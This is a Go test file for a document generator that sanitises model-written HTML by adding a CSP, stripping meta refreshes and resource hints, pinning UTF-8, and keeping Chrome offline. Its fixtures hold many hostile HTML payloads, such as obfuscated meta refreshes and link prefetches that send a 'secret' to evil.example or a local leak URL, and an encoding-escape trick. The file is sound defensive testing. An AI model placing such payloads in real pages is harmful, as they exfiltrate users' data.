package doc

import (
	"flag"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
	"unicode/utf8"
)

var update = flag.Bool("update", false, "update golden files")

// The document is taken from <!doctype>/<html> to the last </html>, whatever
// prose or fence surrounds it; a reply with no </html> (cut off) is refused.
func TestExtractHTML(t *testing.T) {
	for in, want := range map[string]string{
		"```html\n<!DOCTYPE html><html><body>x</body></html>\n```":          "<!DOCTYPE html><html><body>x</body></html>",
		"Here is the document:\n```html\n<html><p>a</p></html>\n```\nDone.": "<html><p>a</p></html>",
		"<html><p>no end": "",
		"just prose":      "",
	} {
		got, ok := extractHTML(in)
		if got != want || ok != (want != "") {
			t.Errorf("extractHTML(%q) = %q, %v; want %q", in, got, ok, want)
		}
	}
}

// The cover is filled from the sheet, the config and --set, never left as
// {{…}} for the model to invent.
func TestFillCover(t *testing.T) {
	sheet := &factSheet{Title: "Calc & Co", Subtitle: "s", DocType: "manual"}
	out := fillCover(templateHTML, sheet, Config{Client: "ACME", Author: "Ana"}, map[string]any{"client": "Globex"}, time.Date(2026, 10, 19, 0, 0, 0, 0, time.UTC))
	if placeholderRe.MatchString(out) {
		t.Fatalf("placeholders left: %v", placeholderRe.FindAllString(out, -1))
	}
	for _, want := range []string{"Globex", "Ana", "Calc &amp; Co", "19 October 2026"} {
		if !strings.Contains(out, want) {
			t.Errorf("cover lacks %q", want)
		}
	}
}

func TestTechnicalMDGolden(t *testing.T) {
	sheet := &factSheet{
		Title:    "Configuration Manual",
		Subtitle: "A detailed reference",
		Sections: []struct {
			Heading string   `json:"heading"`
			Points  []string `json:"points"`
		}{
			{Heading: "Overview", Points: []string{"System overview", "Architecture"}},
			{Heading: "Settings", Points: []string{"ACL configuration", "Default values"}},
		},
		OpenQuestions: []string{"Verify email template IDs"},
	}
	got := technicalMD(sheet)

	// Verify structure.
	if !strings.Contains(got, "Configuration Manual") {
		t.Fatalf("output missing title")
	}
	if !strings.Contains(got, "Overview") {
		t.Fatalf("output missing section heading")
	}
	if !strings.Contains(got, "ACL configuration") {
		t.Fatalf("output missing section point")
	}
	if !strings.Contains(got, "Open questions") {
		t.Fatalf("output missing open questions section")
	}

	// Golden file test.
	if testing.Short() {
		return
	}

	golden := filepath.Join("testdata", "technical_md_golden.md")
	if *update {
		if err := os.MkdirAll("testdata", 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(golden, []byte(got), 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}

	expected, err := os.ReadFile(golden)
	if err != nil {
		t.Fatalf("read golden file %s: %v (run with -update to create it)", golden, err)
	}
	// A Windows checkout may have turned the golden's line ends into CRLF.
	if got != strings.ReplaceAll(string(expected), "\r\n", "\n") {
		t.Fatalf("output differs from golden file %s (run with -update to refresh)", golden)
	}
}

func TestDocResultRender(t *testing.T) {
	r := &docResult{
		HTML: "docs/output.html",
		PDF:  "docs/output.pdf",
		MD:   "docs/output.md",
	}
	got := r.Render()
	if !strings.Contains(got, "docs/output.html") {
		t.Fatalf("render missing HTML path")
	}
	if !strings.Contains(got, "docs/output.pdf") {
		t.Fatalf("render missing PDF path")
	}
	if !strings.Contains(got, "# Document generated") {
		t.Fatalf("render missing header")
	}
}

// The CSP must come first in <head> (it only covers what follows it) and be
// added even when the model left out <head> or <html>.
func TestWithCSP(t *testing.T) {
	cases := []string{
		`<!doctype html><html lang="pt"><HEAD><link href="x"></HEAD><body></body></html>`,
		`<html><body><img src="https://evil/x"></body></html>`,
		`<p>fragment</p>`,
		// A decoy <head> in a comment must not carry the CSP away from the
		// real one, where a script sits.
		`<html><!-- <head> --><head><script>fetch("https://evil")</script></head></html>`,
	}
	for _, in := range cases {
		out := withCSP(in)
		i := strings.Index(out, `http-equiv="Content-Security-Policy"`)
		if i < 0 {
			t.Fatalf("no CSP in %q", out)
		}
		if !strings.HasPrefix(out, "<!DOCTYPE html>") || strings.Count(strings.ToLower(out), "<!doctype") != 1 {
			t.Errorf("doctype not first exactly once: %q", out)
		}
		for _, later := range []string{"<link", "<img", "<p>", "<body", "<script", "<!--"} {
			if j := strings.Index(out, later); j >= 0 && j < i {
				t.Errorf("%q comes before the CSP in %q", later, out)
			}
		}
	}
	for _, must := range []string{"default-src 'none'", "img-src data:"} {
		if !strings.Contains(docCSP, must) {
			t.Errorf("docCSP lost %q", must)
		}
	}
	if strings.Contains(docCSP, "script-src") {
		t.Error("docCSP must not allow scripts")
	}
}

// A model-chosen title never replaces a file the user wrote; a previous doc
// run's trio is regenerated in place.
func TestFreeSlug(t *testing.T) {
	root := t.TempDir()
	docs := filepath.Join(root, "docs")
	if err := os.MkdirAll(docs, 0o755); err != nil {
		t.Fatal(err)
	}
	if got := freeSlug(root, "fresh"); got != "fresh" {
		t.Fatalf("free name: got %q", got)
	}
	if err := os.WriteFile(filepath.Join(docs, "architecture.md"), []byte("# mine"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := freeSlug(root, "architecture"); got != "architecture-2" {
		t.Fatalf("user file: got %q, want architecture-2", got)
	}
	if err := os.WriteFile(filepath.Join(docs, "manual.html"), []byte(withCSP("<html><head></head></html>")), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := freeSlug(root, "manual"); got != "manual" {
		t.Fatalf("own trio: got %q, want manual (regenerate)", got)
	}
}

// Model-written HTML loses every <meta http-equiv> and every <link> whose
// rel reaches the network on its own, however the tag is spelled, quoted,
// entity-encoded or hidden; harmless tags and the text around stay.
func TestSanitizeHTMLRemovesNavigationAndHints(t *testing.T) {
	evil := []string{
		`<meta http-equiv="refresh" content="0;url=https://evil.example/?d=secret">`,
		`<META HTTP-EQUIV=REFRESH CONTENT="0;url=https://evil.example/?d=secret">`,
		`<meta content='0;url=https://evil.example/?d=secret' http-equiv='Refresh'>`,
		`<meta content="0;url=https://evil.example/?d=a>b" http-equiv="refresh">`,
		`<meta/http-equiv=refresh/content=0;url=https://evil.example/>`,
		"<meta\thttp-equiv\n=\n\"refresh\"\fcontent=\"0;url=https://evil.example/\">",
		`<meta http-equiv="Content-Security-Policy" content="default-src *">`,
		`<meta http-equiv="x-dns-prefetch-control" content="on">`,
		`<link rel="dns-prefetch" href="//d.evil.example">`,
		`<link rel=preconnect href="https://evil.example/">`,
		`<LINK REL="PreFetch" HREF="https://evil.example/x">`,
		`<link href="https://evil.example/x" rel='prerender'>`,
		`<link rel="stylesheet preload" href="https://evil.example/x">`,
		`<link rel="&#112;reconnect" href="https://evil.example/">`,
		`<link rel="modulepreload" href="https://evil.example/m.js">`,
		`<link rel="next" href="https://evil.example/n">`,
		// Favicons may be fetched outside the page's CSP.
		`<link rel="icon" href="https://evil.example/f.ico">`,
		`<link rel="shortcut icon" href="https://evil.example/f.ico">`,
		`<link rel="apple-touch-icon" href="https://evil.example/t.png">`,
		// In foreign content a <meta> breaks out of <style> into the page.
		`<svg><style><meta http-equiv="refresh" content="0;url=https://evil.example/"></style></svg>`,
		// A decoy quoted value must not swallow the real tag after it.
		`<!-- <meta a=" --><meta http-equiv=refresh content="0;url=https://evil.example/">" -->`,
		// Removing the inner tag must not splice the outer one together.
		`<me<meta http-equiv=refresh>ta http-equiv=refresh content="0;url=https://evil.example/">`,
		`<li<link rel=preconnect href=x>nk rel=preconnect href="https://evil.example/">`,
	}
	for _, tag := range evil {
		out := sanitizeHTML("<html><head>" + tag + "</head><body><p>kept</p></body></html>")
		low := strings.ToLower(out)
		for _, bad := range []string{"http-equiv", "evil.example", "preconnect", "&#112;"} {
			if strings.Contains(low, bad) {
				t.Errorf("%s\n  left %q in %q", tag, bad, out)
			}
		}
		if !strings.Contains(out, "<p>kept</p>") {
			t.Errorf("%s\n  lost the body: %q", tag, out)
		}
	}

	// Cut off by the end of input: dropped whole, as the browser does.
	if out := sanitizeHTML(`<p>kept</p><meta http-equiv="refresh" content="0;url=https://evil.example/`); out != "<p>kept</p>" {
		t.Errorf("unterminated tag: %q", out)
	}

	keep := []string{
		`<meta name="viewport" content="width=device-width, initial-scale=1">`,
		`<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">`,
		`<metadata>x</metadata>`,
		`<linker rel=preconnect>`,
		`<p>use &lt;meta http-equiv="refresh"&gt; with care</p>`,
	}
	for _, tag := range keep {
		in := "<html><head>" + tag + "</head></html>"
		if out := sanitizeHTML(in); out != in {
			t.Errorf("harmless %s changed to %q", tag, out)
		}
	}
}

// The template itself survives sanitizing with its fonts: only its resource
// hints go.
func TestSanitizeHTMLKeepsTheTemplate(t *testing.T) {
	out := sanitizeHTML(templateHTML)
	if strings.Contains(out, `rel="preconnect"`) {
		t.Error("the template's preconnect hints were kept")
	}
	if !strings.Contains(out, `<link rel="stylesheet" href="https://fonts.googleapis.com/`) {
		t.Error("the template's font stylesheet was removed")
	}
	if strings.Count(out, "<") != strings.Count(templateHTML, "<")-3 {
		t.Error("sanitizing removed more than the two hints and the charset")
	}
}

// A model-chosen encoding cannot rebuild a tag the scan never saw: in
// ISO-2022-JP "ESC ( B" decodes to nothing, so "<me\x1b(Bta http-equiv=…>"
// would become a refresh once the browser decodes it. The written HTML
// declares UTF-8 before anything else, keeps no other declaration, and holds
// no ESC (or other control) byte; invalid UTF-8 is replaced. What is left of
// the hidden tag ("<me(Bta …") is an unknown element in UTF-8.
func TestSanitizeHTMLPinsTheEncoding(t *testing.T) {
	in := "<html><head><meta charset=\"iso-2022-jp\">" +
		"<META CHARSET=shift_jis>" +
		"<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-7\">" +
		"<me\x1b(Bta http-equiv=\"refresh\" content=\"0;url=http://127.0.0.1:18777/leak?secret=X\">" +
		"</head><body><p>a\x00b\x07c\x7fd\xff\xfee\tf\ng</p></body></html>"
	out := withCSP(sanitizeHTML(in))
	if !strings.HasPrefix(out, "<!DOCTYPE html>\n"+docCharset+"\n<meta http-equiv=\"Content-Security-Policy\"") {
		t.Fatalf("UTF-8 declaration not first: %q", out)
	}
	low := strings.ToLower(out)
	if n := strings.Count(low, "charset"); n != 1 {
		t.Errorf("want only our charset declaration, got %d in %q", n, out)
	}
	for _, bad := range []string{"\x1b", "\x00", "\x07", "\x7f", "iso-2022", "shift_jis", "utf-7"} {
		if strings.Contains(low, bad) {
			t.Errorf("left %q in %q", bad, out)
		}
	}
	if !utf8.ValidString(out) {
		t.Errorf("invalid UTF-8 kept: %q", out)
	}
	if !strings.Contains(out, "<p>abcd\uFFFDe\tf\ng</p>") {
		t.Errorf("text around the controls lost: %q", out)
	}
	// An earlier run's output is still recognised by its CSP.
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "docs"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "docs", "x.html"), []byte(out), 0o644); err != nil {
		t.Fatal(err)
	}
	if !ownsSlug(root, "x") {
		t.Error("ownsSlug no longer recognises the doc totem's output")
	}
}

// The PDF render keeps Chrome off the network but for the font hosts, by
// name and by address.
func TestOfflineFlags(t *testing.T) {
	joined := strings.Join(offlineFlags, "\n")
	for _, want := range []string{
		"--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE fonts.googleapis.com , EXCLUDE fonts.gstatic.com",
		"--proxy-server=http://127.0.0.1:9",
		"--proxy-bypass-list=fonts.googleapis.com;fonts.gstatic.com",
		"--dns-prefetch-disable",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("offline flags lack %q:\n%s", want, joined)
		}
	}
}

// The written HTML turns off DNS prefetching after the CSP.
func TestWithCSPDisablesDNSPrefetch(t *testing.T) {
	out := withCSP("<html></html>")
	if i, j := strings.Index(out, docCSP), strings.Index(out, noDNSPrefetch); i < 0 || j < i {
		t.Fatalf("CSP then DNS-prefetch off expected: %q", out)
	}
}
